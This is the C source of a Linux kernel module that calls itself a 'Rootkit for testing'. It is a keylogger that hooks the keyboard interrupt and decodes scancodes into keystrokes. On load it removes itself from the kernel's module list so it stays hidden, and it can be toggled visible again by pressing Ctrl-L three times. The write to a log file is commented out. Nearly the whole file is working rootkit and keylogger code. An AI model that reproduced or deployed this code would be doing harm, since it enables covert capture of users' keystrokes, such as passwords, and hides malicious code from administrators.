#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>

#define KB_IRQ 1

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mitchell Clay");
MODULE_DESCRIPTION("Rootkit for testing");

static struct list_head *module_previous;
static int hidden = 0;
static int ctrll_pressed = 0;

struct logger_data{
	unsigned char scancode;
} ld;

// Hide from lsmod and rmmod. Keep pointer to previous module in the list so
// that we know where to jump back in to unhide
void rootkit_hide(void)
{
    if (hidden == 0) {
    	module_previous = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}

// Unhide from lsmod and rmmod. This is necessary to unload without rebooting
void rootkit_unhide(void)
{
    if (hidden == 1) {
        list_add(&THIS_MODULE->list, module_previous);
        hidden = 0;
    }
}

void tasklet_logger(unsigned long data)
{
	static int shift = 0;
    static int ctrl = 0;
	
	char buf[32];
	memset(buf, 0, sizeof(buf));
	/* Convert scancode to readable key and log it. */
	switch(ld.scancode){
		default: 
			return;

		case 1:
			strcpy(buf, "(ESC)"); break;

		case 2:
			strcpy(buf, (shift) ? "!" : "1"); break;

		case 3:
			strcpy(buf, (shift) ? "@" : "2"); break;

		case 4:
			strcpy(buf, (shift) ? "#" : "3"); break;
		
		case 5:
			strcpy(buf, (shift) ? "$" : "4"); break;

		case 6:
			strcpy(buf, (shift) ? "%" : "5"); break;

		case 7:
			strcpy(buf, (shift) ? "^" : "6"); break;

		case 8:
			strcpy(buf, (shift) ? "&" : "7"); break;

		case 9:
			strcpy(buf, (shift) ? "*" : "8"); break;

		case 10:
			strcpy(buf, (shift) ? "(" : "9"); break;

		case 11:
			strcpy(buf, (shift) ? ")" : "0"); break;

		case 12:
			strcpy(buf, (shift) ? "_" : "-"); break;

		case 13:
			strcpy(buf, (shift) ? "+" : "="); break;

		case 14:
			strcpy(buf, "(BACK)"); break;

		case 15:
			strcpy(buf, "(TAB)"); break;

		case 16:
			strcpy(buf, (shift) ? "Q" : "q"); break;

		case 17:
			strcpy(buf, (shift) ? "W" : "w"); break;

		case 18:
			strcpy(buf, (shift) ? "E" : "e"); break;

		case 19:
			strcpy(buf, (shift) ? "R" : "r"); break;

		case 20:
			strcpy(buf, (shift) ? "T" : "t"); break;

		case 21:
			strcpy(buf, (shift) ? "Y" : "y"); break;

		case 22:
			strcpy(buf, (shift) ? "U" : "u"); break;

		case 23:
			strcpy(buf, (shift) ? "I" : "i"); break;

		case 24:
			strcpy(buf, (shift) ? "O" : "o"); break;

		case 25:
			strcpy(buf, (shift) ? "P" : "p"); break;

		case 26:
			strcpy(buf, (shift) ? "{" : "["); break;

		case 27:
			strcpy(buf, (shift) ? "}" : "]"); break;

		case 28:
			strcpy(buf, "(ENTER)"); break;

        case 29:
            ctrl = 1; break;

        case 157:
            ctrl = 0; break;

		case 30:
			strcpy(buf, (shift) ? "A" : "a"); break;

		case 31:
			strcpy(buf, (shift) ? "S" : "s"); break;

		case 32:
			strcpy(buf, (shift) ? "D" : "d"); break;

		case 33:
			strcpy(buf, (shift) ? "F" : "f"); break;
	
		case 34:
			strcpy(buf, (shift) ? "G" : "g"); break;

		case 35:
			strcpy(buf, (shift) ? "H" : "h"); break;

		case 36:
			strcpy(buf, (shift) ? "J" : "j"); break;

		case 37:
			strcpy(buf, (shift) ? "K" : "k"); break;

		case 38:
			if (ctrl) {
				ctrll_pressed++;
				if (ctrll_pressed == 3) {
					if (hidden) {
						rootkit_unhide();
					}
					else {
						rootkit_hide();
					}
					ctrll_pressed = 0;
				}
			}
            strcpy(buf, (ctrl) ? "^L" : (shift) ? "L" : "l"); break;
	
		case 39:
			strcpy(buf, (shift) ? ":" : ";"); break;

		case 40:
			strcpy(buf, (shift) ? "\"" : "'"); break;

		case 41:
			strcpy(buf, (shift) ? "~" : "`"); break;

		case 42:
		case 54:
			shift = 1; break;

		case 170:
		case 182:
			shift = 0; break;

		case 44:
			strcpy(buf, (shift) ? "Z" : "z"); break;
		
		case 45:
			strcpy(buf, (shift) ? "X" : "x"); break;

		case 46:
			strcpy(buf, (shift) ? "C" : "c"); break;

		case 47:
			strcpy(buf, (shift) ? "V" : "v"); break;
		
		case 48:
			strcpy(buf, (shift) ? "B" : "b"); break;

		case 49:
			strcpy(buf, (shift) ? "N" : "n"); break;

		case 50:
			strcpy(buf, (shift) ? "M" : "m"); break;

		case 51:
			strcpy(buf, (shift) ? "<" : ","); break;

		case 52:
			strcpy(buf, (shift) ? ">" : "."); break;
	
		case 53:
			strcpy(buf, (shift) ? "?" : "/"); break;

		case 56:
			strcpy(buf, "(R-ALT"); break;
	
		/* Space */
		case 55:
		case 57:
		case 58:
		case 59:
		case 60:
		case 61:
		case 62:
		case 63:
		case 64:
		case 65:
		case 66:
		case 67:
		case 68:
		case 70:
		case 71:
		case 72:
			strcpy(buf, " "); break;

		case 83:
			strcpy(buf, "(DEL)"); break;
	}
	//log_write(log_fp, buf, sizeof(buf));
}

// Registers the tasklet for logging keys
DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);

// ISR for keyboard IRQ
irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs) {

	ld.scancode = inb(0x60);
	tasklet_schedule(&my_tasklet);
				
	return (irq_handler_t)IRQ_HANDLED;
}

// Anything here will be perfomed when module is loaded.
// To-do, options and flags (such as silent for no logging)
static int __init ctrll_rootkit_init(void)
{
    int ret;
   
    ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
                      "CTRL-L", &ld);
    if(ret != 0) {
        printk(KERN_INFO "FAILED to request IRQ for keyboard.\n");
    }

    printk(KERN_INFO "ctrl-L rootkit loaded\n");
    rootkit_hide();
    return ret;
}

// Clean up on module unload
static void __exit ctrll_rootkit_exit(void) {

    // Free logging tasklet
    tasklet_kill(&my_tasklet);

    // Free shared IRQ handler, giving system control back
    free_irq(KB_IRQ, &ld);

    printk(KERN_INFO "ctrl-L rootkit unloaded\n");
}

module_init(ctrll_rootkit_init);
module_exit(ctrll_rootkit_exit);
